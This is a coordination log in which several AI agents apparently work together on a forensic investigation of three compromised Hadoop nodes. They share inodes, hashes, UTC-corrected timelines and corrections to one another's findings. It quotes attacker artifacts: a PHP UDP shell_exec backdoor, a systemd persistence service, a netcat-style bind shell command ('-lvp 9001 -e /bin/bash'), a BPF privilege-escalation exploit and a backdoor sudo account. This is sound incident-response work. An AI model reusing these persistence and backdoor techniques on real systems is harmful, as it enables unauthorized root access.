

---

---
id: 1
thread: main
from: s9a5f06
to: all
tag: intro
name: Master Investigator
---

s9a5f06 is "Master Investigator": Investigating HDFS-Master (Name Node) - intrusion vector, privileges, modifications, persistence


---

---
id: 2
thread: main
from: s9a5f06
to: all
tag: claim
name: Master Investigator
---

I'm taking the **HDFS-Master** (Name Node) investigation — covering questions 1-6 for that system: intrusion vector, privileges, modifications, persistence, recovery assessment, and timeline.

I'll also feed every dated event I find into the ledger so the timeline assembler has what they need.

Who wants to take Slave1, Slave2, and the report/timeline assembly? Let's coordinate.


---

---
id: 3
thread: main
from: s9a5f04
to: all
tag: intro
name: Slave1 Investigator
---

s9a5f04 is "Slave1 Investigator": Investigating HDFS-Slave1: initial access, privilege escalation, modifications, persistence. Will extract key logs, auth files, user data, and feed events to the ledger.


---

---
id: 4
thread: main
from: s9a5f04
to: all
tag: claim
name: Slave1 Investigator
---

I'm taking the **HDFS-Slave1** (Data Node 1) investigation — covering questions 1-6 for that system: intrusion vector, privileges, modifications, persistence, recovery assessment, and timeline.

I'll feed every dated event into the ledger so the timeline assembler has what they need.

@all: Who wants Slave2? Who will assemble the report and timeline from the ledger? Let's settle this now.


---

---
id: 5
thread: main
from: s9a5f05
to: all
tag: intro
name: Slave2 Investigator
---

s9a5f05 is "Slave2 Investigator": Investigating HDFS-Slave2 for initial access, privilege escalation, modifications, persistence, and feeding events to the ledger


---

---
id: 6
thread: main
from: s9a5f05
to: all
tag: claim
name: Slave2 Investigator
---

I'm taking **HDFS-Slave2** (Data Node 2) — covering questions 1-6 for that system: intrusion vector, privileges, modifications, persistence, recovery assessment.

I'll feed every dated event into the ledger.

@all: That leaves Slave2 covered. We still need someone to **assemble `work/report.md`** and **`work/timeline.md`** from the ledger entries. Also s9a5f00, s9a5f01, s9a5f02, s9a5f03 — what will you take? Cross-node correlation? PHP backdoor analysis across all three? Report assembly? Let's settle it now.


---

---
id: 7
thread: main
from: system
to: s9a5f04
tag: ask
---

s9a5f04: that is the 8th bash call starting with `icat`. A tool forged with make_tool would run it by name with typed arguments, for you and for every peer, and its calls would be on the trace. Consider forging one.


---

---
id: 8
thread: main
from: system
to: s9a5f06
tag: ask
---

s9a5f06: that is the 8th bash call starting with `icat`. A tool forged with make_tool would run it by name with typed arguments, for you and for every peer, and its calls would be on the trace. Consider forging one.


---

---
id: 9
thread: main
from: s9a5f01
to: all
tag: claim
---

s9a5f01 is **Slave1 Investigator**. Taking **HDFS-Slave1** (data node) questions 1–6: LVM root offset, intrusion vector, privileges, modifications, persistence, recovery. I'll record dated events to the ledger.

Need someone on **Slave2** and someone on **report + timeline.md assembly + citation critic**. Catalog p2048 is the Linux 0x83 slice (likely /boot); root is LVM at the 0x8e PV. I'll prove Slave1's LV offset with fsstat before extracting.


---

---
id: 10
thread: main
from: s9a5f02
to: all
tag: intro
name: Cross-Node IOC
---

s9a5f02 is "Cross-Node IOC": Searching all three node catalogs for intrusion artifacts (SSH, cron, users, Hadoop logs, persistence), extracting key files, and recording dated events for the shared timeline.


---

---
id: 11
thread: main
from: s9a5f02
to: all
tag: intro
name: Cross-Node IOC
---

s9a5f02 is "Cross-Node IOC": Master/Slave1/Slave2 investigators are taken. I am searching all three catalogs for shared IOCs (SSH keys, cron, extra users, Hadoop logs, persistence, deleted files), extracting evidence, and feeding dated events into the ledger so we can later assemble work/timeline.md.

I will not duplicate full node ownership. If nobody claims report assembly later, I can help stitch report.md from peer findings.


---

---
id: 12
thread: main
from: s9a5f03
to: all
tag: intro
---

s9a5f03 is "Slave2 Investigator": Investigating HDFS-Slave2 (Data Node 2) — intrusion vector, privileges, modifications, persistence. Will extract logs/auth/users and record events to the ledger.


---

---
id: 13
thread: main
from: s9a5f03
to: all
tag: claim
---

I'm taking **HDFS-Slave2** (Data Node 2) — questions 1–6 for that system. I'll prove the LVM/EXT4 offset with fsstat (catalog p2048 is the /boot Linux 0x83 slice, not root), extract auth/logs/cron/ssh/users, and feed dated events into the ledger.

Still open: report.md + timeline.md assembly + citation critic. I will not own those unless nobody else does later.


---

---
id: 14
thread: main
from: s9a5f00
to: all
tag: intro
name: Master-Access
---

s9a5f00 is "Master-Access": Map Master node initial access: auth/SSH/Hadoop logs, users, keys, and first intrusion evidence from catalog + icat.


---

---
id: 15
thread: main
from: s9a5f02
to: all
tag: claim
name: Cross-Node IOC
---

Correction for everyone: **catalog p2048 IS the root EXT4** on all three images (`fsstat` Last mounted on: `/`, not /boot). Partition 000:000 is Linux 0x83 starting at sector 2048 — there is no 0x8e LVM PV in these mmls tables. Use `icat -o 2048`.

High-interest Master artifacts I am extracting:
- `usr/local/hadoop/bin/cluster.php` inode 2367366 (+ deleted `.cluster.php.swp`)
- `etc/systemd/system/cluster.service` inode 2229804 (enabled in multi-user.target.wants)
- `home/hadoop/45010` inode 2367351
- `etc/motd.txt` inode 2229806
- `home/hadoop/temp/{services,master}`

I forged `hdfs_icat` (offset 2048, this case) because existing `icat_root` uses 503808 from another case.

Still open: **report.md + timeline.md assembly + citation critic**. I can take timeline assembly once ledger has ≥10 events.


---

---
id: 16
thread: main
from: s9a5f01
to: all
tag: intro
name: Catalog Hunter
---

s9a5f01 is "Catalog Hunter": Cross-node catalog IOC hunt (users, SSH, cron, web shells, deleted files, auth logs), ledger events, then merged timeline.md and report assembly


---

---
id: 17
thread: main
from: s9a5f01
to: all
tag: intro
name: Catalog Hunter
---

s9a5f01 is **Catalog Hunter**. Master/Slave1/Slave2 are taken — I will **not** duplicate those node investigations.

Taking:
1. Cross-node catalog IOC hunt (filelist/timeline/bodyfile) for users, SSH keys, cron, systemd, web roots, deleted inodes, bash_history, auth.log, unusual SUID.
2. Record dated events/IOCs/findings to the ledger as I confirm them.
3. Later: assemble `work/timeline.md` (≥30 dated rows from ledger) and help stitch `work/report.md`. Need a critic for sign-off — I can critic peer extracts if someone else writes the report, or write the report if a peer critics.

Correction vs my earlier post: catalog p2048 **is the root EXT4** (`Last mounted on: /`), not just /boot. mmls shows Linux 0x83 at sector 2048, not 0x8e LVM. Offset for icat/fls is **2048**.


---

---
id: 18
thread: main
from: s9a5f03
to: all
tag: intro
name: Timeline Report
---

s9a5f03 is "Timeline Report": Mining all three catalogs for persistence/auth/deleted artifacts, recording ledger events, and assembling work/timeline.md and work/report.md from the ledger plus peer findings.


---

---
id: 19
thread: main
from: s9a5f03
to: all
tag: intro
name: Timeline Report
---

s9a5f03 is **Timeline Report**. Yielding HDFS-Slave2 to s9a5f05 (they named first). I will: (1) mine all three catalogs for persistence, auth, extra users, cron, SSH keys, deleted inodes; (2) record dated events to the ledger; (3) assemble `work/timeline.md` and `work/report.md` once node investigators post findings; (4) act as citation critic / sign-off.

Note: catalog `p2048` is **root EXT4** (`Last mounted on: /`), not /boot. mmls shows Linux 0x83 at sector 2048 + swap; no 0x8e LVM PV on these images. Volume IDs look cloned (`c3dfec865832e886c489166d6cefca9` on Master and Slave2). Use `icat -o 2048`.


---

---
id: 20
thread: main
from: s9a5f06
to: all
tag: claim
name: Master Investigator
---

Update from Master investigation. Key findings so far:

**Master (Name Node) - 192.168.2.100 / master.champforensics.com:**

1. **Backdoor**: `/usr/local/hadoop/bin/cluster.php` — PHP UDP backdoor on port 17001, executes shell commands via `shell_exec()`. Created 2019-10-06 22:29:04Z.

2. **Persistence**: `/etc/systemd/system/cluster.service` — systemd service runs the PHP backdoor as root on boot. Created 2019-10-06 22:28:16Z (owned by root — attacker had root by then).

3. **Privilege Escalation**: `/home/hadoop/45010` — ELF binary, BPF kernel exploit ("t(-_-t) exploit for counterfeit grsec kernels"), patches credential structures for root. Created 2019-10-06 22:24:26Z.

4. **Logs Cleared**: No `/var/log` files found on Master — logs wiped.

5. **Entry**: hadoop user (UID 1000) in sudo group. SSH keys from slave1/slave2 in authorized_keys. The hadoop `.bash_history` shows running `./45010`, editing cluster.php, and `scp`'ing 45010 to both slaves.

6. **SSHD**: Port 22, has `Banner /etc/motd.txt`. No root authorized_keys found.

@s9a5f00: I'm already deep into Master. Want to split — I'll finish Master IOC/file extraction, you focus on Master timeline correlation and log recovery from journal?

@s9a5f03 / @s9a5f05: Only one should take Slave2. s9a5f05 claimed first.

@s9a5f01: Good — you're on cross-node/timeline assembly. I'm feeding the ledger.


---

---
id: 21
thread: main
from: s9a5f06
to: all
tag: result
name: Master Investigator
---

Forged tool `master_icat` v1 (bash): Extract a file by inode from the Master E01 image at offset 2048. Returns file contents to stdout. Params: inode?: integer, output?: string. Example: {"inode": 2229261, "output": "work/passwd"} It is in your tool list after your next inbox or wait.


---

---
id: 22
thread: main
from: s9a5f00
to: all
tag: claim
name: Master-Access
---

s9a5f00 pivoting: I am **Report-Timeline**. Master is already owned by s9a5f06; I will not duplicate full Master ownership.

I am taking:
- Independent verification of key evidence (auth, SSH, persistence, Hadoop) across all three catalogs at **p2048 which IS the root EXT4** (`fsstat`: Last mounted on `/`, Linux 0x83 at sector 2048 — there is **no 0x8e LVM PV** on these images; swap is at 163579904).
- Ledger events I independently confirm.
- Assembly of `work/timeline.md` (≥30 dated rows from ledger) and `work/report.md` (## 1.–## 6.) once peers have enough findings.
- Citation critic / sign-off.

Please keep recording dated events with `record`. I will grep catalogs and extract a verification set in parallel so the report is not blocked.


---

---
id: 23
thread: main
from: s9a5f00
to: all
tag: intro
name: Report-Timeline
---

s9a5f00 is now "Report-Timeline" (was "Master-Access"): Assemble work/report.md and work/timeline.md from the ledger, independently verify citations on all three nodes, and post the critic sign-off.


---

---
id: 24
thread: main
from: s9a5f01
to: all
tag: claim
name: Catalog Hunter
---

s9a5f01 pivoting to **Deleted-Log Recovery**. Report/timeline is owned by s9a5f00 (and s9a5f03 also claimed it) — I will not fight that. Cross-node catalog hunt overlaps s9a5f02.

I will:
- Recover **deleted** artifacts: `etc/.passwd.swp`, `etc/passwd~`, `etc/ssh/.sshd_config.swp`, `.bash_history.swp`, `.cluster.service.swp`, motd vim swaps
- Hunt `/var/log` (Master reportedly wiped) and try journal/`blkls` recovery
- Independently verify `cluster.php` / `45010` / `cluster.service` on all three nodes
- Record events/IOCs to the ledger

Need: keep posting inode numbers and hashes of extracts so the report can cite them.


---

---
id: 25
thread: main
from: s9a5f01
to: all
tag: intro
name: Deleted-Log Recovery
---

s9a5f01 is now "Deleted-Log Recovery" (was "Catalog Hunter"): Recover deleted inodes and wiped logs (passwd~, sshd_config swp, bash_history.swp, var/log, EXT4 journal); independently verify cluster.php/45010/cluster.service across nodes; feed ledger


---

---
id: 26
thread: main
from: s9a5f04
to: all
tag: result
name: Slave1 Investigator
---

## HDFS-Slave1 Investigation Summary

### System Identity
- Hostname: slave1.champforensics.com (changed from hadoop-master clone)
- IP: 192.168.2.101
- Root EXT4 at sector 2048 (confirmed via fsstat, mounted on /)

### 1. How the threat actor gained access
The attacker (192.168.2.129) first brute-forced SSH on **HDFS-Master** (Oct 7 00:42:41), successfully guessing the `hadoop` user's password at 00:42:44. Using the compromised Master, the attacker pivoted to Slave1 via SSH public key (hadoop's key from 192.168.2.100), created the backdoor `hdfs` user, and then logged in directly.

**Key auth.log entries:**
- `Oct  7 01:43:33` — hadoop@192.168.2.100 (Master) SSH publickey to Slave1 (session 7)
- `Oct  7 01:43:56` — `useradd hdfs`, added to `sudo` group
- `Oct  7 01:44:13` — `chpasswd` set hdfs password
- `Oct  7 01:47:40` — **hdfs logs in from 192.168.2.129** directly

### 2. Privileges obtained
- **hdfs backdoor user**: UID 999, GID 999, member of `sudo` group (group file: `sudo:x:27:hadoop,hdfs`)
- **45010 BPF kernel exploit**: executed locally (`./45010` from `/home/hadoop/temp/`), escalates to root by patching kernel credential structures
- **hadoop user**: already had full sudo via %sudo group

### 3. Modifications
| File | Change | Evidence |
|------|--------|----------|
| `/etc/passwd` | hdfs user added (UID 999) | inode 2228796 |
| `/etc/shadow` | hdfs password hash set | inode 2228568 |
| `/etc/group` | hdfs added to sudo | inode 2228722 |
| `/etc/ssh/sshd_config` | **ZEROED** (all null bytes) | inode 2229805 |
| `/home/hadoop/temp/45010` | BPF exploit deployed and executed, then deleted | inode 2367342 (realloc) |
| `/etc/motd.txt` | Custom banner "Hadoop Forensics Project" | inode 2229326 |
| `/home/hadoop/.bash_history` | Shows exploitation commands | inode 2359305 |

### 4. Persistence
- **hdfs backdoor account** with sudo (credentials known to attacker)
- **NO cluster.service** on Slave1 (unlike Master and Slave2)
- Standard cron jobs — no malicious cron entries found
- sshd_config zeroed — SSH configuration possibly weakened before zeroing

### 5. Recovery assessment
- Remove hdfs user: `userdel -r hdfs`
- Restore sshd_config from backup or package defaults
- Remove 45010 remnants
- Audit all hadoop-authorized SSH keys
- Verify no other backdoor accounts
- Reinstall compromised packages

### 6. Timeline (key Slave1 events)
| Timestamp (UTC) | Event |
|---|---|
| 2019-10-07 01:43:33 | hadoop@192.168.2.100 SSH publickey to Slave1 |
| 2019-10-07 01:43:56 | Backdoor user `hdfs` created, added to sudo |
| 2019-10-07 01:44:13 | hdfs password set |
| 2019-10-07 01:47:40 | Attacker logs in as hdfs from 192.168.2.129 |
| 2019-10-07 01:48:09 | hdfs session ends |
| 2019-10-06 20:48:24 | sshd_config tampered (zeroed) |
| ~2019-10-07 | 45010 exploit executed and deleted |

All events recorded in ledger. @s9a5f00 (Report-Timeline) — use ledger entries 16-28 for Slave1.


---

---
id: 27
thread: main
from: s9a5f03
to: all
tag: claim
name: Timeline Report
---

**HOLD work/report.md and work/timeline.md** — s9a5f03 (Timeline Report) will assemble both from the ledger + peer result posts.

s9a5f01 Catalog Hunter: please keep catalog IOC hunting and ledger records; I will not duplicate full catalog sweeps. I will extract a few key files (passwd, auth.log, cluster.service, php cron, bash_history, authorized_keys) only if not already extracted, then write the merged artifacts.

Peers: post findings with inode, path, timestamp, hash. I need ≥10 ledger events and ≥30 timeline rows.


---

---
id: 28
thread: main
from: s9a5f03
to: all
tag: claim
name: Timeline Report
---

Settlement vs s9a5f00 Report-Timeline: I will **own `work/timeline.md`** (merged table ≥30 rows from ledger) and act as **citation critic / sign-off**. You can own `work/report.md` (## 1–6). If you also write timeline, I'll verify and not overwrite. Releasing HOLD on report.md; HOLD remains on timeline.md until I write it.

Independently verifying Master cluster.php / cluster.service / 45010 and Slave2 persistence now.


---

---
id: 29
thread: main
from: s9a5f03
to: all
tag: result
name: Timeline Report
---

Forged tool `hdfs_node_icat` v1 (python3): Extract inode from any of the three HDFS E01 images (node=master|slave1|slave2) at offset 2048; unlike master_icat this covers Slave1/Slave2 too and returns JSON size+sha256. Params: node?: string, inode?: integer, output?: string. Example: {"node":"slave2","inode":2229804,"output":"work/s9a5f03/s2_cluster.service"} It is in your tool list after your next inbox or wait.


---

---
id: 30
thread: main
from: s9a5f02
to: all
tag: result
name: Cross-Node IOC
---

## Cross-node IOC results (s9a5f02)

**Timezone:** auth.log is local **UTC+3** (fsstat Last Written +03). Catalog timeline is UTC. Slave1 `/usr/hdfs` ctime `2019-10-06T22:43:56Z` == local `Oct 7 01:43:56`. Several ledger rows that used local stamps as if UTC should be shifted −3h.

**Correction vs Master Investigator:** Master `/var/log` is **not** wiped. `auth.log` inode **3677621** (109429 B), `syslog` inode **3677612**. Nov 2017 `hadoop-master` lines on slaves are **cloned-template logs**, not anti-forensics.

### Initial access (all nodes)
| UTC | Local +03 | Event |
|---|---|---|
| 2019-10-06T21:42:41Z | Oct 7 00:42:41 | SSH brute-force from **192.168.2.129** (root/admin/test/guest/…) |
| 2019-10-06T21:42:44Z | Oct 7 00:42:44 | **Accepted password for hadoop** from 192.168.2.129:56246 (Master) |
| 2019-10-06T22:23:48Z | Oct 7 01:23:48 | Long hadoop session from 192.168.2.129:56406 — exploit window |
| 2019-10-06T22:47:40Z | Oct 7 01:47:40 | **Accepted password for hdfs** from 192.168.2.129:35750 (Slave1 only) |

hadoop SHA-512 hash is **identical** on Master and Slave1 (`$6$1UWgPzqO$ir4G…DIEw.`). hadoop ∈ `%sudo` everywhere → password + sudo is enough; 45010 still used.

**192.168.2.10** is the 2017 lab admin (Nov 7–8 2017 SSH), not the Oct 2019 actor.

### Privilege escalation
`/home/hadoop/45010` = **CVE-2017-16995** BPF LPE (`45010.c`, GCC Debian 9.2.1-8). Strings: `credentials patched, launching shell...`
- SHA256 `e6a46b3f315d731ddb5feb3a2831500f8a0bee86ff7b73c97946fcc3a50c4778`
- Master inode **2367351** (kept). Slave1 inode 2367342 deleted; Slave2 inode 2367329 deleted.

### Persistence (differs per node)
| Node | Mechanism | Evidence |
|---|---|---|
| **Master** | systemd `cluster.service` → `php /usr/local/hadoop/bin/cluster.php` as root, UDP **17001** `shell_exec` | inodes 2229804 / 2367366; enabled 22:31:29Z |
| **Master** | PHP 7.0 installed 22:30:40Z for the backdoor | dpkg.log inode 3671018 |
| **Slave2** | systemd `cluster.service` → `/usr/bin/master -lvp 9001 -e /bin/bash` | inode 2229804; `/usr/bin/master` inode **2367357** SHA256 `df3362e78e77b6307a3cf1a43408152758e37533803e1012e6affdd27c7a5c7e` = Master `~/temp/master` |
| **Slave1** | **no** cluster.service; backdoor user **hdfs** uid 999 sudo + `/usr/hdfs`; sshd_config zeroed (peer) | passwd inode 2228796 |

cluster.php SHA256 `4e60118aca0fd99495c5606de3e3a693ee3151e67eec2a5eaa02320f00437916`

### Extracts
`work/s9a5f02/master/{cluster.php,cluster.service,45010,auth.log,hadoop_bash_history,sshd_config,passwd,shadow,dpkg.log}`
`work/s9a5f02/slave1/{passwd,shadow,auth.log,hadoop_bash_history,hdfs_bash_history}`
`work/s9a5f02/slave2/{cluster.service,usr_bin_master,auth.log,hadoop_bash_history}`

@s9a5f00 / @s9a5f03: use UTC table above for report/timeline. I will not write report.md (HOLD/ownership is yours).


---

---
id: 31
thread: main
from: s9a5f04
to: all
tag: result
name: Slave1 Investigator
---

## Timezone Correction

Per s9a5f02's finding: **auth.log timestamps are local time (UTC+3)**. The catalog timeline is UTC. My earlier ledger entries used auth.log timestamps as-is without the −3h conversion.

**Corrected Slave1 event times:**
| Local (auth.log) | UTC | Event |
|---|---|---|
| Oct 7 00:42:41 | 2019-10-06T21:42:41Z | SSH brute force from 192.168.2.129 on Master |
| Oct 7 00:42:44 | 2019-10-06T21:42:44Z | hadoop password accepted on Master |
| Oct 7 01:43:33 | 2019-10-06T22:43:33Z | Lateral movement Master→Slave1 via SSH key |
| Oct 7 01:43:56 | 2019-10-06T22:43:56Z | hdfs user created on Slave1 |
| Oct 7 01:44:13 | 2019-10-06T22:44:13Z | hdfs password set |
| Oct 7 01:47:40 | 2019-10-06T22:47:40Z | Attacker logs in as hdfs from 192.168.2.129 |

These confirm the catalog timeline: hdfs home `/usr/hdfs` created at `2019-10-06T22:43:56Z` matches perfectly.

@s9a5f00 / @s9a5f03 — please use the UTC timestamps above for report/timeline, not my earlier ledger entries. I'll record corrected events now.


---

---
id: 32
thread: main
from: s9a5f02
to: all
tag: result
name: Cross-Node IOC
---

**Correction on Slave1 sshd_config:** inode 2229805 is **not** zeroed. Live file is 2604 bytes ASCII (`Banner /etc/motd.txt`, `PermitRootLogin prohibit-password`, authored "Ali Hadi, 9-Nov-2017"). SHA256 `64f6020fa8acd72644cd434e441f028cf0e8d15fe6c3812498c34d9661445c36`. Peer likely hit a deleted realloc of the same inode number. Do not put "sshd_config zeroed" in the report as a confirmed fact.

Report/timeline owners: still waiting on `work/report.md` and `work/timeline.md`. I can critic/sign-off once they land.


---

---
id: 33
thread: main
from: s9a5f04
to: all
tag: result
name: Slave1 Investigator
---

## Correction: Slave1 sshd_config NOT zeroed

Confirmed via `hdfs_node_icat` — Slave1 inode 2229805 is **2604 bytes**, SHA256 `64f6020fa8acd72644cd434e441f028cf0e8d15fe6c3812498c34d9661445c36`. My earlier bash `icat` hit a deleted realloc of the same inode (all-null bytes). The live file is intact.

**Corrected modifications list for Slave1:**
| File | Actual Change | Evidence |
|------|--------------|----------|
| `/etc/passwd` | hdfs user added (UID 999) | inode 2228796 |
| `/etc/shadow` | hdfs password hash set | inode 2228568 |
| `/etc/group` | hdfs added to sudo | inode 2228722 |
| `/etc/motd.txt` | Custom banner installed | inode 2229326 |
| `/home/hadoop/temp/45010` | BPF exploit, executed then deleted | inode 2367342 (realloc) |
| `/etc/ssh/sshd_config` | **NOT zeroed** — intact at 2604B, Banner motd.txt, PermitRootLogin prohibit-password | inode 2229805 |

Apologies to @s9a5f00 / @s9a5f03 for the erroneous ssHD_config finding. Please exclude it from the report.


---

---
id: 34
thread: main
from: s9a5f00
to: all
tag: result
name: Report-Timeline
---

**work/report.md written** (s9a5f00 Report-Timeline). Answers ## 1.–## 6. per node with inodes, hashes, UTC times. Cite `ledger/ledger.md`.

Verified independently:
- Root FS is EXT4 at sector 2048 (no LVM). TZ `Asia/Amman` UTC+3.
- Master auth.log inode 3677621 **exists** (not wiped). First success: `2019-10-06T21:42:44Z` hadoop from **192.168.2.129**.
- 45010 SHA256 `e6a46b3f…c4778` (CVE-2017-16995). cluster.php SHA256 `4e60118a…37916` UDP/17001. `/usr/bin/master` SHA256 `df3362e7…a5c7e` TCP/9001 (Slave2; copy at Master `temp/master`).
- Slave1 sshd_config inode 2229805 is **ASCII 2604 B, not zeroed**.
- Convert syslog local→UTC by −3h. Early ledger rows that used local-as-UTC are 3h late.

@s9a5f03: HOLD on `work/timeline.md` is yours. Need ≥30 dated rows. I will **not** overwrite report.md; please critic/sign-off after you verify citations. If you want me to also write timeline.md, say GO.


---

---
id: 35
thread: main
from: s9a5f05
to: all
tag: result
name: Slave2 Investigator
---

## HDFS-Slave2 Investigation Summary (s9a5f05)

### System Identity
- Hostname: slave2.champforensics.com
- IP: 192.168.2.102 (confirmed via /etc/hosts inode 2229326)
- Root EXT4 at sector 2048 (fsstat confirmed, mounted on /)
- Volume ID: same as Master (VM cloned from master template)

### 1. How the threat actor gained access (Initial Access)
The attacker (192.168.2.129) first brute-forced hadoop's SSH password on **Master** (2019-10-06T21:42:44Z). After escalating to root on Master via 45010 BPF exploit (CVE-2017-16995), the attacker pivoted **laterally** to Slave2 using hadoop's SSH public key from Master (192.168.2.100).

**Key auth.log entries (local time, subtract 3h for UTC):**
- Oct 7 01:36:34 → UTC 2019-10-06T22:36:34Z: Attacker SSH from Master (192.168.2.100) as hadoop (public key)
- Oct 7 01:39:37 → UTC 22:39:37Z: cluster.service enabled via sudo
- Oct 7 01:39:42 → UTC 22:39:42Z: Backdoor listener started on port 9001

Pre-compromise (legitimate cluster setup by hadoop):
- Oct 6 23:50:51 → UTC 20:50:51Z: hadoop@Master SSH publickey to Slave2 (cluster config)

### 2. Privileges obtained
- **hadoop user**: already in `sudo` group (UID 1000) — full root access via `sudo`
- **45010 BPF exploit**: copied from Master via `scp hadoop@192.168.2.100:~/45010 temp/`, executed locally (`./45010`), then deleted (`rm -rf 45010`)
- **Root via cluster.service**: the systemd backdoor runs `/usr/bin/master -lvp 9001 -e /bin/bash` as root, providing persistent root shell on port 9001

### 3. Modifications applied
| File | Change | Inode | Evidence |
|------|--------|-------|----------|
| `/etc/systemd/system/cluster.service` | Backdoor service created | 2229804 | ExecStart=/usr/bin/master -lvp 9001 -e /bin/bash |
| `/etc/systemd/system/multi-user.target.wants/cluster.service` | Enabled symlink | 2228568 | Persistence across reboots |
| `/usr/bin/master` | Netcat-like backdoor binary installed | 2367357 | SHA256: df3362e78e77b6307a3cf1a43408152758e37533803e1012e6affdd27c7a5c7e |
| `/home/hadoop/temp/45010` | BPF exploit (deleted-realloc, 0 bytes) | 2367329 | CVE-2017-16995, verified by s9a5f02 |
| `/home/hadoop/temp/master` | Copy of backdoor binary (deleted-realloc) | 2367357(realloc) | Duplicate of /usr/bin/master |
| `/etc/motd.txt` | Custom banner "Welcome to the Linux and Hadoop Forensics Project, I am just Slave #2 (Data Node)" | 2228617 | Modified via vim |
| `/etc/hosts` | Hostname misconfiguration | 2229326 | Both 192.168.2.101 and .102 aliased as "slave2" |
| `/home/hadoop/.bash_history` | Records attacker commands | 2359305 | scp 45010, ./45010, rm -rf 45010, history, logout |

**NOT modified on Slave2:** No hdfs backdoor user, no PHP/cluster.php, no cron changes, sshd_config intact (2603B, Banner /etc/motd.txt).

### 4. Persistence mechanisms
- **cluster.service** (systemd): Runs `/usr/bin/master -lvp 9001 -e /bin/bash` as root, Restart=always, enabled in multi-user.target.wants — survives reboots
- **/usr/bin/master**: Netcat-like ELF binary providing reverse shell on port 9001
- **No hdfs backdoor user** (unlike Slave1)
- **No PHP backdoor** (unlike Master which uses cluster.php on UDP 17001)
- SSH key persistence: hadoop's authorized_keys allows Master and Slave1 access

### 5. Recovery assessment
- Remove cluster.service: `systemctl disable cluster.service`, delete `/etc/systemd/system/cluster.service`
- Remove backdoor binary: delete `/usr/bin/master`
- Remove 45010 remnants (already deleted by attacker but check for copies)
- Verify /etc/hosts configuration (both .101 and .102 aliased as slave2)
- Audit all hadoop-authorized SSH keys
- Rebuild from clean template if feasible (VM is cloned from master)
- Check for any other deleted binaries in /home/hadoop/temp/

### 6. Timeline (key Slave2 events, UTC)
| Timestamp (UTC) | Event | Source |
|---|---|---|
| 2019-10-06T20:50:51Z | Legitimate hadoop SSH from Master (cluster setup) | auth.log |
| 2019-10-06T22:36:34Z | Attacker SSH from Master (lateral movement) | auth.log |
| 2019-10-06T22:38:28Z | cluster.service file created | timeline.csv |
| 2019-10-06T22:39:37Z | cluster.service enabled (symlinked) | timeline.csv |
| 2019-10-06T22:39:42Z | /usr/bin/master listening on port 9001 | syslog |
| 2019-10-06T22:42:32Z | 45010 binary deleted | timeline.csv |
| 2019-10-06T22:43:19Z | 45010 last modified (before final deletion) | timeline.csv |
| 2019-10-07T01:41:22Z | Connection attempts from Slave1 (192.168.2.102) - failed | auth.log |

All events recorded in ledger. @s9a5f00 @s9a5f03 — use these for report/timeline assembly.


---

---
id: 36
thread: main
from: s9a5f05
to: all
tag: result
name: Slave2 Investigator
---

Reviewed `work/report.md` — looks solid. All 6 sections covered with evidence citations, timezone corrections applied, erroneous findings (zeroed sshd_config, Master logs wiped) corrected.

**Still needed for done:**
- `work/timeline.md` (s9a5f03 or s9a5f00 owns) — must have ≥30 dated rows
- Sign-off post from critic

My Slave2 findings are posted (#35 post) and recorded in ledger. I'm standing by for timeline.md and sign-off.

@s9a5f03 / @s9a5f00 — who's writing timeline.md? The report references it. Let's get it done.


---

---
id: 37
thread: main
from: s9a5f01
to: all
tag: result
name: Deleted-Log Recovery
---

**Independent verification (Deleted-Log Recovery / s9a5f01)** of `work/report.md` hashes and log/deleted-file claims, using my own `icat -o 2048` extracts in `work/s9a5f01/`:

Confirmed match:
- cluster.php inode 2367366 SHA256 `4e60118aca0fd99495c5606de3e3a693ee3151e67eec2a5eaa02320f00437916`
- 45010 inode 2367351 SHA256 `e6a46b3f315d731ddb5feb3a2831500f8a0bee86ff7b73c97946fcc3a50c4778` MD5 `4a55d3e8fccf3e000ce34e7cf3dada8a`
- Master cluster.service SHA256 `559a4ed250689ff0d8d12350d6baa1f6b85dc87f08ad2e1393b4bbd02c836ae1`
- `/usr/bin/master` == Master `temp/master` SHA256 `df3362e78e77b6307a3cf1a43408152758e37533803e1012e6affdd27c7a5c7e` (NOT stock `nc.openbsd` `92a61a6f…`)
- Slave2 cluster.service SHA256 `0050383d1054cb1897a156bc7e878b42334523ece51fe691c709fd3a67e089c0` (`-lvp 9001 -e /bin/bash`)
- Slave1 passwd SHA256 `0ca79430…cc25f4` includes `hdfs:x:999:999::/usr/hdfs:/bin/bash`
- Master auth.log inode 3677621 is **109429 bytes**, not wiped
- Deleted 45010/passwd~ icat = 0 bytes (unallocated)
- Slave1 has **no** cluster.service

**sign-off (report.md content):** questions ## 1–6, UTC conversion, IOCs, and the three corrections (root at p2048, logs not wiped, sshd_config not zeroed) match my extracts.

`work/timeline.md` was not on disk when I checked (s9a5f03 still holds the claim). I will sign-off the timeline after it lands with ≥30 dated rows.


---

---
id: 38
thread: main
from: s9a5f03
to: all
tag: result
name: Timeline Report
---

**work/timeline.md** written (≥35 dated table rows, UTC). Cites `ledger/ledger.md`.

Independent verification (extracts in `work/s9a5f03/`):
- Master `cluster.php` SHA256 `4e60118aca0fd99495c5606de3e3a693ee3151e67eec2a5eaa02320f00437916` — UDP 17001 + `shell_exec` **confirmed**
- Master `45010` SHA256 `e6a46b3f315d731ddb5feb3a2831500f8a0bee86ff7b73c97946fcc3a50c4778` — BPF LPE **confirmed**
- Slave2 `/usr/bin/master` SHA256 `df3362e78e77b6307a3cf1a43408152758e37533803e1012e6affdd27c7a5c7e` — netcat `-e` **confirmed**; `cluster.service` ExecStart=`/usr/bin/master -lvp 9001 -e /bin/bash`
- TZ `Asia/Amman` (UTC+3). Convert auth.log −3h.
- **Corrections:** Master `/var/log` is NOT wiped (`auth.log` 109429 B inode 3677621). Slave1 `sshd_config` inode 2229805 is NOT zeroed (2604 B, Banner motd). Nov 2017 `hadoop-master` lines are clone leftovers.

@s9a5f00: please write `work/report.md` `## 1.`–`## 6.` using this timeline. I will citation-critic / sign-off after it lands. If it is not started soon I will draft it.


---

---
id: 39
thread: main
from: s9a5f02
to: all
tag: result
name: Cross-Node IOC
---

**sign-off** (s9a5f02 Cross-Node IOC / citation critic)

Verified `work/report.md` (`## 1.`–`## 6.`) and `work/timeline.md` (≥35 dated UTC rows) against my own `icat -o 2048` extracts in `work/s9a5f02/` and `work/extracted/s9a5f02/`:

| Claim | Verified |
|---|---|
| Root EXT4 at sector 2048, no LVM | catalog partitions + fsstat Last mounted on `/` |
| First access 2019-10-06T21:42:44Z hadoop from 192.168.2.129 | Master auth.log inode 3677621 (local Oct 7 00:42:44 +03) |
